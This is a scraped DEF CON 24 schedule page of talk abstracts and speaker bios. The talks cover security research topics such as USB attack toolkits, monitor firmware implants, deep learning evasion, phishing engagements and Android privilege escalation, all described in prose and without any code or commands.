<h2 class="talkTitle">DIY Nukeproofing: A New Dig at 'Datamining'</h2>
<h3 class="speaker">3AlarmLampScooter <span class="speakerTitle">Hacker</span></h3>

<p class="abstract">Does the thought of nuclear war wiping out your data keep you up at night? Don't trust third party data centers? Few grand burning a hole in your pocket and looking for a new Sunday project to keep you occupied through the fall? If you answered yes to at least two out of three of these questions, then 3AlarmLampscooter's talk on extreme pervasive communications is for you! You'll learn everything from calculating radiation half layer values to approximating soil stability involved in excavating your personal apocalypse-proof underground data fortress.</p>

<p class="speakerBio"><strong>3AlarmLampScooter</strong> is an enigmatic armored mammal of the genus homo sapiens sapiens sapiens troglodyte found in caves and tunnels across the southeastern United States. As moderator of the subreddit /r/Neutron, 3AlarmLampscooter's enunciation espouses pervasive communication via excavation to protect from radiation and conflagration. When above-ground, 3AlarmLampscooter is a vocal transhumanism advocate developing 3D printed construction materials.<br><br>

<h2 class="talkTitle">The Remote Metamorphic Engine: Detecting, Evading, Attacking the AI and Reverse Engineering</h2>
<h3 class="speaker">Amro Abdelgawad <span class="speakerTitle">Founder, Immuneye</span></h3>

<p class="abstract">As a matter of fact, it is all about time to reverse engineer the most complex piece of code. Code complicity techniques are usually used just to increase the time and effort needed for reverse engineering. The desired effect of code complicity can be magnified using mechanisms that decrease and narrow the allowed time frame for any reverse engineering attempt into few milliseconds. Such approach can be applied using a metamorphic engine that is aware of the time dimension.<br><br>

Beyond metamorphic applications for AV evasion, in this talk, we will present a novel approach to resist and evade reverse engineering using a remote metamorphic engine that generates diversified morphed machine code of a very short expiration lifetime. Our approach is based on a client-server model using challenge-response communication protocol made of morphed machine code rather than data. We will show how any reverse engineering attempt on such model will be forced to execute or emulate the morphed code. Thus the code will always have an upper hand to detect, evade and attack the reverse engineering environment. Our approach is immune to static code analysis as the functionalities and the communication protocol used are dynamically diversified remotely and do not exist in packed executable files. On the other hand, clock synchronized morphed machine code driven by a remote metamorphic engine would trap dynamic RE attempts in the maze of metamorphism. One that is immune to code tampering and reversing by detecting the non-self.<br><br>

We will present the fundamental difference between metamorphic and polymorphic techniques used to evade AV compared to the ones that can be used to resist RE. We will show how a remote diversified metamorphic self-modifying code with a very short expiration lifetime can detect, evade, and resist any code analysis, reverse engineering, machine learning and tampering attempts.</p>

<p class="abstract">MR. ROBOT is a rare treat - a network television show whose hacker protagonist is a fully realized character with a realistically attainable set of skills. No hyper-typing, no gibberish masquerading as tech jargon, no McGuffins to magically paper over plot holes with hacker dust. MR. ROBOT takes the tech  as seriously as the drama. <br><br>

One of the main reasons for this verisimilitude is the work of Kor Adana, MR. ROBOT's advisor on all things hackish. His fingerprints are on every terminal window in the show. Another advisor to the show is our very own CJunky - known to the outside world as hacker and raconteur Marc Rogers. Join Dark Tangent for a panel discussion of MR. ROBOT: the phenomenon, the hacks and the crazy ways the show seems to pull its storylines from the future. Bring your questions, and keep an eye out for late-breaking special guests.</p>

<p class="speakerBio"><strong>Kor Adana’s</strong> interest in technology started as a child when he tried to build a red box to get free calls on pay phones. By the time he was in middle school, he was building his own computer systems and getting into trouble. After obtaining a B.S. in IT Network Administration, Kor went on to work in enterprise network security for one of the world’s largest automakers. He performed penetration testing, designed security policies, managed enterprise-wide eDiscovery, and conducted forensics for legal and HR matters. While there, he also worked alongside NASA in a high-profile government investigation. He eventually left the IT world to pursue his true passion, writing for film and television. He’s worked with the producers of THE WALKING DEAD, THE SHIELD, LOST, and DEXTER. He is currently a writer and technical supervisor for USA's Golden Globe Award-winning drama, MR. ROBOT. He also has one of his own projects in development with Universal Cable Productions.<br><br>

<p class="abstract">So, you think you want to be a penetration tester, or you already are and don't understand what the difference between you and all the other "so called" penetration testers out there. Think you know the difference between a Red Team, Penetration Test and a Vulnerability assessment? Know how to write a report your clients will actually read and understand? Can you leverage the strengths of your team mates to get through tough roadblocks, migrate, pivot, pwn and pillage? No? well this talk is probably for you then! We will go through the fascinating, intense and often crazily boring on-site assessment process. Talk about planning and performing Red Teams, how they are different, and why they can be super effective and have some fun along the way. I'll tell you stories that will melt your face, brain and everything in between. Give you the answers to all of your questions you never knew you had, and probably make you question your life choices. By the end of this session you will be ready to take your next steps into the job you've always wanted, or know deep inside that you should probably look for something else. There will be no judgment or shame, only information, laughter and fun.</p>

<h3 class="speaker">ashmastaflash <span class="speakerTitle">Hacker</span></h3>

<p class="abstract">It's recently become easier and less expensive to create malicious GSM Base Transceiver Station (BTS) devices, capable of intercepting and recording phone and sms traffic. Detection methods haven't evolved to be as fast and easy to implement. Wireless situational awareness has a number of challenges. Categorically, these challenges are usually classified under Time, Money, or a lot of both. Provisioning sensors takes time, and the fast stuff usually isn’t cheap. Iterative improvements compound the problem when you need to get software updates to multiple devices in the field. I’ll present a prototype platform for GSM anomaly detection (called SITCH) which uses cloud-delivered services to elegantly deploy, manage, and coordinate the information from many independent wireless telemetry sensors (IoT FTW). We’ll talk about options and trade-offs when selecting sensor hardware, securing your sensors, using cloud services for orchestrating firmware, and how to collect and make sense of the data you’ve amassed. Source code for the prototype will be released as well. The target audience for this lecture is the hacker/tinkerer type with strong systems and network experience. A very basic understanding of GSM networks is a plus, but not required.</p>

<p class="abstract">You want to phish your company or your client. You’ve never done this for work before, you’ve got a week to do it, and you figure that’s plenty of time. Then someone objects to the pretext at the last minute. Or spam filters block everything. Or you decide to send slowly, to avoid detection, but the third recipient alerts the entire company. Or you can only find 5 target addresses. We’ve all been there on our first professional phishing exercise. What should be as easy as building a two page web site and writing a clever e-mail turns into a massively frustrating exercise with a centi-scaled corpus of captured credentials. In this talk, we’ll tell you how to win at phishing, from start to finish, particularly in hacking Layer 8, the "Politics" layer of the OSI stack that’s part of any professional phishing engagement. We’ll share stories of many of our experiences, which recently included an investigation opened with the US Security and Exchange Commission (SEC). Finally, we’ll tell you how we stopped feeling frustrated, learned to handle the politics, and produced successful phishing campaigns that hardened organizations at the human layer, and started to screw things up for the bad actors.</p>

<p class="abstract">Since these last few years our world has been getting smarter and smarter. We may ask ourselves: what does smart mean? It is the possibility of building systems which are nodes of a more complex network, digitally connected to the internet and to the final users. Our cities are becoming one of those networks and over time more and more elements are getting connected to such network: from traffic lights to information signs, from traffic and surveillance cameras to transport systems. </p>

<p class="abstract">This last element, also called as Smart Mobility is the subject of our analysis, divided in three sub-element, each one describing a different method of transport in our city: Private transport: for this method we analyze the smart alternatives aimed to make parking activity easy, hassle free and more convenient Shared transport: we focus our attention on those systems which are sharing transport vehicles. In particular we deal with bike sharing which seems to be the most wide spread system in European cities Public transport: object of our analysis for this section is the bus, metro and tram network The aim of our analysis is understanding the ecosystem which each element belongs to and performing a security evaluation of such system. In this way the most plausible attack and fraud scenarios are pointed out and the presence of proper security measures is checked. </p>

<p class="abstract">Network telescopes are collections of unused but BGP-announced IP addresses. They collect the pollution of the Internet: scanning, misconfigurations, backscatter from DoS attacks, bugs, etc.  For example, several historical studies used network telescopes to examine worm outbreaks.</p>

By examining this pollution we find a wealth of security-related data.  Specifically, I'll touch on scanning trends, DoS attacks that leverage open DNS resolvers to overwhelm authoritative name servers, BitTorrent index poisoning attacks (which targeted torrents with China in their name), a byte order bug in Qihoo 360 (while updating, this security software sent acknowledgements to wrong IP addresses... for 5 years), and the consequence of an error in Sality's distributed hash table.</p>

<p class="abstract">What is the root cause of memory and network traffic bloat? Our current research using tools we previously released Badger at Black Hat in 2014 and the Kobra released at BsidesLV 2015 shows a 40 percent increase in outside unique IP traffic destinations and a 400 percent increase in data transmitted towards these destinations. But through the course of the research we found currently used IRP monitoring tools were lacking to help produce enough information to forensically investigate the exfiltration of user metadata. Pinworm is a sniffer that shows all created IRPs created in the kernel in I/O devices. The IRPs are correlated with the processes that created them and the called driver stack. With network traffic data we are off to the races. Using pinworm which we released this week, we will show forensic case studies from cradle to grave of what happens when you do things online in social media sites. </p>
<p class="abstract">Like all of our previously released tools, Pinworm is a framework including server side code you can use to collect and display user metadata inline in browser frames. Does this metadata collection happen in the browser, in userland, or in the kernel? Come to our talk and find out.

Despite the continued popularity of these single-cup coffee conjurers at home as well as in the workplace, it has become clear that these devices are not impervious to mechanical and/or electrical failure. It was this intersection of extremely prevalent hardware and relatively short lifespan that prompted me to begin exploring the upper limits of what could be created by repurposing one of the most popular pod-based machines: the Keurig. In this session, we will walk through some real-world examples of &lsquo;MacGyver&rsquo;-style creative problem-solving, we'll go hands on (yes, pun intended) with stuff made from repurposed Keurigs, and finally, I'll reflect on lessons learned from looking for potential in things most people deem common and unremarkable.</p>

<h3 class="speaker">Jonathan Brossard (endrazine) <span class="speakerTitle">Master of Darkness, MOABI.com</span></h3>

<p class="abstract">With this presentation, we take a new approach to reverse engineering. Instead of attempting to decompile code, we seek to undo the work of the linker and produce relocatable files, the typical output of a compiler. The main benefit of the later technique over the former being that it does work. Once achieved universal code &lsquo;reuse&rsquo; by relinking those relocatable objects as arbitrary shared libraries, we'll create a form of binary reflection, add scripting capabilities and in memory debugging using a JIT compiler, to attain automated API prototyping and annotation, which, we will argue, constitutes a primary form of binary code self awareness. Finally, we'll see how abusing the dynamic linker internals shall elegantly solve a number of complex tasks for us, such as calling a given function within a binary without having to craft a valid input to reach it. <br><br>The applications in terms of vulnerability exploitation, functional testing, static analysis validation and more generally computer wizardry being tremendous, we'll have fun demoing some new exploits in real life applications, and commit public program profanity, such as turing PEs into ELFs, functional scripting of sshd in memory, stealing crypto routines without even disassembling them, among other things that were never supposed to work.

<p class="abstract">Cloud service providers offer their customers the ability to deploy virtual machines in a multi-tenant environment. These virtual machines are typically connected to the physical network via a virtualized network configuration. This could be as simple as a bridged interface to each virtual machine or as complicated as a virtual switch providing more robust networking features such as VLANs, QoS, and monitoring. At DEF CON 23, we presented how attacks known to be successful on physical switches apply to their virtualized counterparts. Here, we present new results demonstrating successful attacks on more complicated virtual switch configurations such as VLANs. In particular, we demonstrate VLAN hopping, ARP poisoning and Man-in-the-Middle attacks across every major hypervisor platform. We have added more hypervisor environments and virtual switch configurations since our last disclosure, and have included results of attacks originating from the physical network as well as attacks originating in the virtual network.</p>

<h2 class="talkTitle">Crypto: State of the Law</h2>
<h3 class="speaker">Nate Cardozo <span class="speakerTitle">Senior Staff Attorney, Electronic Frontier Foundation</span></h3>

<p class="abstract">Strong end-to-end encryption is legal in the United States today, thanks to our victory in what’s come to be known as the Crypto Wars of the 1990s. But in the wake of Paris and San Bernardino, there is increasing pressure from law enforcement and policy makers, both here and abroad, to mandate so-called backdoors in encryption products. In this presentation, I will discuss in brief the history of the first Crypto Wars, and the state of the law coming into 2016. I will then discuss what happened in the fight between Apple and the FBI in San Bernardino and the current proposals to weaken or ban encryption, covering proposed and recently enacted laws in New York, California, Australia, India, and the UK. Finally, I will discuss possible realistic outcomes to the Second Crypto Wars, and give my predictions on what the State of the Law will be at the end of 2016.</p>

<h2 class="talkTitle">Robot Hacks Video Games: How TASBot Exploits Consoles with Custom Controllers</h2>
<h3 class="speaker">Allan Cecil (dwangoAC) <span class="speakerTitle">President, North Bay Linux User's Group</span></h3>

<p class="abstract">TASBot is an augmented Nintendo R.O.B. robot that can play video games without any of the button mashing limitations us humans have. By pretending to be a controller connected to a game console, TASBot triggers glitches and exploits weaknesses to execute arbitrary opcodes and rewrite games. This talk will cover how these exploits were found and will explore the idea that breaking video games using Tool-Assisted emulators can be a fun way to learn the basics of discovering security vulnerabilities. After a brief overview of video game emulators and the tools they offer, I'll show a live demo of how the high accuracy of these emulators makes it possible to create a frame-by-frame sequence of button presses accurate enough to produce the same results even on real hardware. After demonstrating beating a game quickly I'll show how the same tools can be used to find exploitable weaknesses in a game's code that can be used to trigger an Arbitrary Code Execution, ultimately treating the combination of buttons being pressed as opcodes. Using this ability, I'll execute a payload that will connect a console directly to the internet and will allow the audience to interact with it. An overview of some of the details that will be described in the talk can be found in an article I coauthored for the PoC||GTFO journal (Pokemon Plays Twitch, <a href="https://www.alchemistowl.org/pocorgtfo/pocorgtfo10.pdf">page 6</a> ).</p>

<p class="abstract">Rogue access points provide attackers with powerful capabilities, but in 2016 modern privacy protections such as HTTPS Everywhere, free TLS certificates and HSTS are de-facto standards. Surely our encrypted traffic is now safe on the local coffee shop network? If not, my VPN will definitely protect me... right? In this talk we'll reveal how recent improvements in online security and privacy can be undermined by decades old design flaws in obscure specifications. These design weakness can be exploited to intercept HTTPS URLs and proxy VPN tunneled traffic. We will demonstrate how a rogue access point or local network attacker can use these new techniques to bypass encryption, monitor your search history and take over your online accounts. No logos, no acronyms; this is not a theoretical crypto attack. We will show our techniques working on $30 hardware in under a minute. Online identity? Compromised. OAuth? Forget about it.

<h2 class="talkTitle">Machine Duping 101: Pwning Deep Learning Systems</h2>
<h3 class="speaker">Clarence Chio <span class="speakerTitle">ML Hacker</span></h3>

<p class="abstract">Deep learning and neural networks have gained incredible popularity in recent years. The technology has grown to be the most talked-about and least well-understood branch of machine learning. Aside from it's highly publicized victories in playing Go, numerous successful applications of deep learning in image and speech recognition has kickstarted movements to integrate it into critical fields like medical imaging and self-driving cars. In the security field, deep learning has shown good experimental results in malware/anomaly detection, APT protection, spam/phishing detection, and traffic identification. This DEF CON 101 session will guide the audience through the theory and motivations behind deep learning systems. We look at the simplest form of neural networks, then explore how variations such as convolutional neural networks and recurrent neural networks can be used to solve real problems with an unreasonable effectiveness. Then, we demonstrate that most deep learning systems are not designed with security and resiliency in mind, and can be duped by any patient attacker with a good understanding of the system. The efficacy of applications using machine learning should not only be measured with precision and recall, but also by their malleability in an adversarial setting. After diving into popular deep learning software, we show how it can be tampered with to do what you want it do, while avoiding detection by system administrators.<br><br>

Besides giving a technical demonstration of deep learning and its inherent shortcomings in an adversarial setting, we will focus on tampering real systems to show weaknesses in critical systems built with it. In particular, this demo-driven session will be focused on manipulating an image recognition system built with deep learning at the core, and exploring the difficulties in attacking systems in the wild. We will introduce a tool that helps deep learning hackers generate adversarial content for arbitrary machine learning systems, which can help make models more robust. By discussing defensive measures that should be put in place to prevent the class of attacks demonstrated, we hope to address the hype behind deep learning from the context of security, and look towards a more resilient future of the technology where developers can use it safely in critical deployments.</p>

<p class="abstract">There are multiple x86 processors in your monitor! OSD, or on-screen-display controllers are ubiquitous components in nearly all modern monitors. OSDs are typically used to generate simple menus on the monitor, allowing the user to change settings like brightness, contrast and input source. However, OSDs are effectively independent general-purpose computers that can: read the content of the screen, change arbitrary pixel values, and execute arbitrary code supplied through numerous control channels. We demonstrate multiple methods of loading and executing arbitrary code in a modern monitor and discuss the security implication of this novel attack vector. <br><br>We also present a thorough analysis of an OSD system used in common Dell monitors and discuss attack scenarios ranging from active screen content manipulation and screen content snooping to active data exfiltration using Funtenna-like techniques. We demonstrate a multi-stage monitor implant capable of loading arbitrary code and data encoded in specially crafted images and documents through active monitor snooping. This code infiltration technique can be implemented through a single pixel, or through subtle variations of a large number of pixels. We discuss a step-by-step walk-through of our hardware and software reverse-analysis process of the Dell monitor. We present three demonstrations of monitoring exploitation to show active screen snooping, active screen content manipulation and covert data exfiltration using Funtenna. <br><br>Lastly, we discuss realistic attack delivery mechanisms, show a prototype implementation of our attack using the USB Armory and outline potential attack mitigation options. We will release sample code related to this attack prior to the presentation date.</p>

<h2 class="talkTitle">Universal Serial aBUSe: Remote Physical Access Attacks</h2>
<h3 class="speaker">Rogan Dawes <span class="speakerTitle">Researcher, Sensepost</span><br/> Dominic White <span class="speakerTitle">CTO, SensePost</span></h3>




<p class="abstract">In this talk, we’ll cover some novel USB-level attacks, that can provide remote command and control of, even air-gapped machines, with a minimal forensic footprint, and release an open-source toolset using freely available hardware.</p>

<p class="abstract">In 2000, Microsoft published its 10 Immutable laws of security [1]. One of which was "if a bad guy has unrestricted access to your computer, it's not your computer anymore." This has been robustly demonstrated over the years. Examples include numerous DMA-access attacks against interfaces such as firewire [2], PCMCIA and thunderbolt [3] as well as USB-based attacks including simple in-line keyloggers, "evil maid" attacks [4] and malicious firmware [5].</p>

<p class="abstract">Despite these warnings, groups such as the NSA were still able to use physical access to bypass software controls with toolsets such as COTTONMOUTH [6]. Likewise, criminals have been able to defraud banks with a handful of simple hardware tricks [7]. While some progress has been made to secure some devices against some threats, such as the use of full disc encryption, or the impact of Apple's secure enclave in the physical security of the iPhone [8], most laptops and desktops remain vulnerable to attacks via physical interfaces.</p>

<p class="abstract">In our experience, organisations merely view USB devices as a channel for malware or unsanctioned communications, and rely on protections placed elsewhere in their defensive stack to deal with them, but few deal with the risk the USB interface presents directly. There are many scenarios where gaining physical access to hosts is plausible [9], and having done so can provide access to "chewy" internal networks [10] ripe for lateral movement. </p>

<p class="abstract">While most people are familiar with USB devices, many don't realise the extent to which the USB standard allows seemingly innocuous devices to have multiple personalities. There has been an extensive amount of research into malicious USB devices, such as TURNIPSCHOOL [15], GoodFET/Facedancer [16], Shikra [17], Rubber Ducky [11], USBdriveby [12] and BadUSB [5]. However, none of these implement an end-to-end attack either because that was not their intention, they only focus on a part of the attack or the project was never completed.</p>

<p class="abstract">Additionally, existing attacks are predominantly "send only" with no built-in bidirectional communications. They usually rely on the executed payload and the host’s networks for any advanced remote access. Thus, these payloads can leave a significant forensic footprint in the form of network communications and on-host behaviours, and leave them vulnerable to anti-malware controls. Numerous companies are improving toolsets to detect such attacks [13][14]. Lastly, these attacks are often "spray and pray", unable to account for variations in the user's behaviour or computer setup.</p>

<p class="abstract">Our approach is to create a stealthy bi-directional channel between the host and device, with remote connectivity via 3G/Wi-Fi/Bluetooth and offload the complexity to our hardware, leaving a small simple stub to run on the host. This talk will discuss the process of creating a set of malicious USB devices using low cost hardware. The design and toolkit will be released during the talk.</p>

<p class="abstract">Our toolkit provides three significant improvements over existing work. The first is the ability to gain a stealthy bi-directional channel with the host via the device. No traffic is generated on the target network (i.e it would work against air-gapped hosts). This is done via the use of either a raw HID device or standard USB class printer driver linked to our device, with the stub merely wrapping commands and their output to our device. The second is the ability to communicate with the device remotely via Wi-Fi/3G/Bluetooth, allowing for updates to the payloads, exfiltration of data, real-time interaction with the host and an ability to debug problems. This also has the advantage that any network controls are bypassed. Finally, the stub running on the host will leave a minimal forensic trail, making detection of the attack, or analysis of it later, difficult. For completeness sake, a new transport for metasploit was developed to allow metasploit payloads to be used instead.</p>

<p class="abstract">Our hope is that the tools will provide a method of demonstrating the risk of physical bypasses of software security without an NSA budget, and encourage defences to be built in this area.</p>

<h3 class="speaker">Jonathan-Christofer Demay <span class="speakerTitle">Airbus Defence and Space </span><br>
Arnaud Lebrun <span class="speakerTitle">Airbus Defence and Space</span></h3>




<p class="abstract">In the past few years, several tools have been released allowing hobbyists to connect to CAN buses found in cars. This is welcomed as the CAN protocol is becoming the backbone for embedded computers found in smartcars. Its use is now even spreading outside the car through the OBD-II connector: usage-based policies from insurance companies, air-pollution control from law enforcement or engine diagnostics from smartphones for instance. Nonetheless, these tools will do no more than what professional tools from automobile manufacturers can do. In fact, they will do less as they do not have knowledge of upper-layer protocols. Security auditors are used to deal with this kind of situation: they reverse-engineer protocols before implementing them on top of their tool of choice. However, to be efficient at this, they need more than just being able to listen to or interact with what they are auditing. Precisely, they need to be able to intercept communications and block them, forward them or modify them on the fly. This is why, for example, a framework such as Burp Suite is popular when it comes to auditing web applications. In this paper, we present CANSPY, a framework giving security auditors such capabilities when auditing CAN devices. Not only can it block, forward or modify CAN frames on the fly, it can do so autonomously with a set of rules or interactively using Ethernet and a packet manipulation framework such as Scapy.<br><br> It is also worth noting that it was designed to be cheap and easy to build as it is mostly made of inexpensive COTS. Last but not least, we demonstrate its versatility by turning around a security issue usually considered when it comes to cars: instead of auditing an electronic control unit (ECU) through the OBD-II connector, we are going to partially emulate ECUs in order to audit a device that connects to this very connector.</p>

<h2 class="talkTitle">Auditing 6LoWPAN Networks using Standard Penetration Testing Tools</h2>
<h3 class="speaker">Jonathan-Christofer Demay <span class="speakerTitle">Airbus Defence and Space</span><br> Adam Reziouk<br> Arnaud Lebrun</h3>




<p class="abstract">The Internet of Things is expected to be involved in the near future in all major aspects of our modern society. On that front, we argue that 6LoWPAN is a protocol that will be a dominant player as it is the only IoT-capable protocol that brings a full IP stack to the smallest devices. As evidence of this, we can highlight the fact that even the latest ZigBee Smart Energy standard is based on ZigBee IP which itself relies on 6LoWPAN, a competitor of the initial ZigBee protocol. Efficient IP-based penetration testing tools have been available to security auditors for years now. However, it is not that easy to use them in the context of a 6LoWPAN network since you need to be able to join it first. In fact, the difficult part is to associate with the underlying IEEE 802.15.4 infrastructure.<br><br>
Indeed, this standard already has two iterations since its release in 2003 and it provides with several possibilities regarding network topology, data transfer model and security suite. Unfortunately, there is no off-the-shelf component that provides, out of the box, with such a wide range of capabilities. Worst still, some of them deviate from the standard and can only communicate with components from the same manufacturer. In this paper, we present the ARSEN project: Advanced Routing for 6LoWPAN and Ethernet Networks. It provides security auditors with two new tools.<br><br>
First, a radio scanner capable of identifying IEEE 802.15.4 infrastructures and for each one of them their specificities, including several deviations from the standard that we encountered in actual security audits.<br><br>
Secondly, a border router capable of routing IPv6 datagrams between Ethernet and 6LoWPAN networks while adapting to the specificities identified by the scanner. As a result, the combination of both effectively allows security auditors to use available IP-based penetration testing tools on different 6LoWPAN networks.</p>

In addition to introducing each of the different aspects and areas of DEF CON, we have a panel of speakers that will talk about how they came to be part of DEF CON and their personal experiences over the years. Oh yeah, there is the time honored "Name the Noob", lots of laughs and maybe even some prizes.  Plus, stay for the after party.  Seriously, there is an after party.  How awesome is that?</p>

<p class="speakerBio"><strong> Mike Petruzzi (wiseacre) </strong> started at DEF CON participating in the Capture the Flag contest.  Determined to do better the next year, he participated again.  This time the format was 36 hours straight.  He realized he was missing out on everything else that was happening at DEF CON.  From then on he made a point to participate in as much as he could.  Of course, within the limits of social anxiety so, if it allowed participation as a wallflower, he was in!  Now, he wants to make sure everyone else gets to know as much as possible about this year's conference.  In his private life, Mike hacks managers and is happy anyone listens to him at all. Mike would like to thank Highwiz for everything. <br></p>

<p class="speakerBio"><strong>Ryan "LosT" Clarke</strong> has been involved with DEF CON for 16 years. In addition to his role on the CFP board, LosT serve's as DEF CON's official Cryptographer and Puzzle Master. He is best known for his early LosT @ CON Mystery Challanges designed to force creative thinking, and also introduced him to his amazing wife! Now he is responsible for designing the badges and lanyards for DEF CON, in addition to torturing a subculture of enthusiastic crypto fans with his ever-so-subtle clues and red herring rabbit holes in his yearly Badge challenge. LosT enjoys learning as much as he can about as much as he can. He can usually be found around CON in the 1o57 room, mostly encouraging and sometimes distracting a ragged band of sleep-deprived attendees who are racing to complete the challenge.<br></p>


<p class="speakerBio"><strong>CrYpT</strong> first attended DEF CON at DC10 as CrAzE, where he made the common mistake of staying on the sidelines and not actively participating in all DEF CON had to offer. The experience was tough for him and he did not return for many years. He tried again at DC17, but this time he made the decision to start putting himself out there. After a marked improvement in the quality of his experience, he was determined to make each year better than the last. At DC20 he received the handle CrYpT from Y3t1 and met some people who would remain his closest friends to this day (looking at you Clutch). Now he leads the awesome, hard-working Inhuman Registration team in their quest to badge all the people. He's a member of the CFP Review Board and Security Tribe. In an effort to help welcome all the new faces at DEF CON, he is returning for his second year to the DC 101 panel. He encourages people to reach out and ask questions so they can get the most bang for their badge.<br></p>

<p class="speakerBio">Born of glitter and moon beams, <strong>HighWiz</strong> is the things that dreams are made of and nightmares long to be... Years ago, with the help of some very awesome people* he set about to create an event that would give the n00bs of Def Con a place to feel welcomed and further their own pursuit of knowledge. For years he has held onto the simple tenet that "You get out of Def Con what you put into it". Sometimes HighWiz can be a bit much to swallow and hard to take. HighWiz is a member of the CFP Review Board and Security Tribe. </p>
<p>*Some (but not all) of the people HighWiz would like to thank for helping to make 101 into what it is today : Runnerup, Wiseacre, Nikita, Roamer, Lockheed, Pyr0, Zac, V3rtgio, 1o57, Neil, Beaker, AlxRogan, Jenn, Zant, GM1, Clutch, TheDarkTangent, Siviak, Ripshy, Valkyrie, Xodia, Flipper and all the members of Security Tribe. After taking a year off from the 101 Panel, HighWiz is honored to once again be participating in it, as it marks its eighth year.</p>
  
<p class="speakerBio"><strong>Jay Korpi</strong> is not of the traditional hacker world; CrYpT invited him to DEF CON 6 years ago, and as a surgical first assist, he decided it was not of any interest to him. CrYpT insisted every year until finally three years ago CrYpT told him "there are people there smarter than you..." Jay couldn't believe it and had to see it for himself. His first year, it was obvious there were MANY people smarter than he was. Once he met some amazing people who were both inviting and generous, Jay vowed to get involved with DEF CON somehow so he could provide the same experience to others. He found his opportunity last year when he joined the Inhuman Registration team and was invited to share his experiences on the DC 101 panel. He attributes these opportunities to his willingness to put himself out there and meet as many people as possible from his very first CON.</p>

<p class="speakerBio"><strong>Nikita Kronenberg</strong>
  Nikita works to ensure DEF CON runs as smoothly as one can expect from a hacker conference. In addition to planning a vast array of details prior to DEF CON and thwarting issues while onsite, she also serves as the Director of Call For Papers and Workshops. In this role she systematically processes hundreds of submissions, organizes the CFP Board, and manages the entire CFP process from beginning to end. While no one relishes the job of rejecting submissions, Nikita strives to make the experience more positive with personal feedback and alternative speaking opportunities. Once talks have been selected, she weaves the final list into a comprehensive four day schedule over multiple speaking tracks. She serves as a primary point-of-contact for speakers leading up to DEF CON and acts as a liaison between speakers, press, and social media content organizers. Beyond the CFP, Nikita also works full-time on various behind-the-scenes administration and project management for DEF CON. As a DEF CON goon for the past 13 years, her superpowers involve putting out fires before they spark and juggling a multitude of tasks while balancing on an over-inflated ball. - rkut nefr ldbj gtjd bjws oayh qtmf york uykr fqwx awtr kumf giwk nxtw -<br></p> <p>Twitter: @Niki7a

<h3 class="speaker">Brad Dixon, Hacker</span></h3>




<p class="abstract">Security assessments of embedded and IoT devices often begin with testing how an attacker could recover firmware from the device. When developers have done their job well you'll find JTAG locked-up, non-responsive serial ports, locked-down uboot, and perhaps even a home brewed secure-boot solution. In this session you'll learn details of a useful hardware/software penetration technique to attempt when you've run out of easier options. We've used this technique on two commercial device security assessments successfully and have refined the technique on a series of test devices in the lab. This session will cover the prerequisites for successful application of the technique and give you helpful hints to help your hack! Best of all this technique, while a bit risky to the hardware, is easy to try and doesn't require specialized equipment or hardware modification. We are going to take pieces of metal and stab them at the heart of the hardware and see what happens. For the hardware/firmware developer you'll get a checklist that you can use to reduce your vulnerability to this sort of attack.</p>

<p class="abstract">Historically, machine learning for information security has prioritized defense: think intrusion detection systems, malware classification and botnet traffic identification. Offense can benefit from data just as well. Social networks, especially Twitter with its access to extensive personal data, bot-friendly API, colloquial syntax and prevalence of shortened links, are the perfect venues for spreading machine-generated malicious content. We present a recurrent neural network that learns to tweet phishing posts targeting specific users. The model is trained using spear phishing pen-testing data, and in order to make a click-through more likely, it is dynamically seeded with topics extracted from timeline posts of both the target and the users they retweet or follow. We augment the model with clustering to identify high value targets based on their level of social engagement such as their number of followers and retweets, and measure success using click-rates of IP-tracked links. Taken together, these techniques enable the world's first automated end-to-end spear phishing campaign generator for Twitter.</p>

<p class="abstract">Following recent security issues discovered in Android, Google made a number of changes to tighten security across its fragmented landscape. However, Google is not alone in the struggle to keep Android safe. Qualcomm, a supplier of 80% of the chipsets in the Android ecosystem, has almost as much effect on Android’s security as Google. With this in mind, we decided to examine Qualcomm’s code in Android devices. During our research, we found multiple privilege escalation vulnerabilities in multiple subsystems introduced by Qualcomm to all its Android devices in multiple different subsystems. In this presentation we will review not only the privilege escalation vulnerabilities we found, but also demonstrate and present a detailed exploitation, overcoming all the existing mitigations in Android’s Linux kernel to run kernel-code, elevating privileges and thus gaining root privileges and completely bypassing SELinux.</p>

<p class="abstract">If you’re interested in vulnerability research for fun or profit, or if you’re a beginner and you’re not sure how to progress, it can be difficult to sift through the firehose of technical information that’s out there. Plus there are all sorts of non-technical things that established researchers seem to just know. There are many different things to learn, but nobody really talks about the different paths you can take on your journey. We will provide an overview of key concepts in vulnerability research, then cover where you can go to learn more - and what to look for. We’ll suggest ways for you to choose what you analyze and provide tools and techniques you might want to use. We’ll discuss different disclosure models (only briefly, we promise!), talk about the different kinds of responses to expect from vendors, and give some advice on how to write useful advisories and how to go about publishing them. Then, we’ll finish up by covering some of the &lsquo;mindset&rsquo; of vulnerability research, including skills and personality traits that contribute to success, the different stages of growth that many researchers follow, and the different feelings (yes, FEELINGS) that researchers can face along the way. Our end goal is to help you improve your chances of career success, so you can get a sense of where you are, where you want to go, and what you might want to do to get there. We will not dig too deeply into technical details, and we’d go so far as to say that some kinds of vulnerability research do not require deep knowledge anyway. Vulnerability research isn’t for everyone, but after this talk, maybe you’ll have a better sense of whether it’s right for you, and what to expect going forward.</p>

<h3 class="speaker">Chris Eagle <span class="speakerTitle">sk3wl 0f fucking r00t</span></h3>




<p class="abstract">It is not uncommon that a software reverse engineer finds themselves desiring to execute a bit of code they are studying in order to better understand that code or alternatively to have that code perform some bit of useful work related to the reverse engineering task at hand. This generally requires access to an execution environment capable of supporting the machine code being studied, both at an architectural level (CPU type) and a packaging level (file container type). Unfortunately, this is not always a simple matter. The majority of analysts do not have a full complement of hosts available to support a wide variety of architectures, and virtualization opportunities for non-intel platforms are limited. In this talk we will discuss a light weight emulator framework for the IDA Pro disassembler that is based on the Unicorn emulation engine. The goal of the project is to provide an embedded multi-architectural emulation capability to complement IDA Pro's multi-architectural disassembly capability to enhance the versatility of one of the most common reverse engineering tools in use today.</p>

